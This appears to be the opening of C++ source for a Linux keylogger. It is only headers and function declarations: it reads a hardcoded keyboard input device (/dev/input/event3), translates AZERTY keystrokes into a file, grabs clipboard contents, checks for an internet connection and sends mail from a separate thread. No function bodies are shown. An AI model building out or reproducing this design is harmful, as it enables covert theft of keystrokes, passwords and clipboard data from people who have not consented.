#include <sys/types.h>
#include <sys/stat.h>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <linux/input.h>
#include <iostream>
#include <string>
#include <cstring>
#include <fstream>
#include <cctype>
#include <X11/Xlib.h>

using namespace std;

#define log(s)   GetKeys((char*)s)
#  if __WORDSIZE == 64
#   define LONG_MAX	9223372036854775807L
#  else
#   define LONG_MAX	2147483647L
#  endif
#define keyboardDevice  "/dev/input/event3"

void letter_azerty(ofstream& file, int val, bool upper);
void num(ofstream& file, int val);
void others(ofstream& file, int val, int special);

char* getClipBoard(const char *bufname, const char *fmtname);
void GetKeys(const char* kbd_dev);

bool checkInternet();
void* sendMail(void* );
